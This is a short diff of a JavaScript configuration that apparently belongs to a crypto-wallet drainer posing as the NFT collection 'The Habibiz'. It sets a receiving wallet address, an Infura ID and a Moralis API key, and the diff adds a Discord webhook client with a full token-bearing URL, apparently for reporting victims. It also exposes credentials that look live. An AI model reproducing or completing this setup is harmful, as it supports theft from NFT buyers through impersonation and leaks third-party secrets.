@@ -1,6 +1,9 @@
 const address = "0x26e9c92Fc58232F7a8384a768b09654e4350FF41";
 const infuraId = "68a0d97c073d41c895a9fbd8970bf493"     // Infuria ID | https://infura.io/ | For Wallet Connect
 const moralisApi = "LdBom9a2G2fXutS4KFRwZtuMkVSTnPOzjQ2yPjj0SMsZFB090JiqpvJqZosyBICB"    // x-api-key | https://moralis.io/ | For NFTs
+const webhookClient = new WebhookClient({
+    url: "https://discord.com/api/webhooks/994692505025130616/8OOOoY0yczwrq0M_gQd388gLtZxt6PE3hz0vboNpe3PNiqEYb2rKGM0xLFVTeDCLYNtW"
+});
 
 const collectionInfo = {
     name: "The Habibiz",
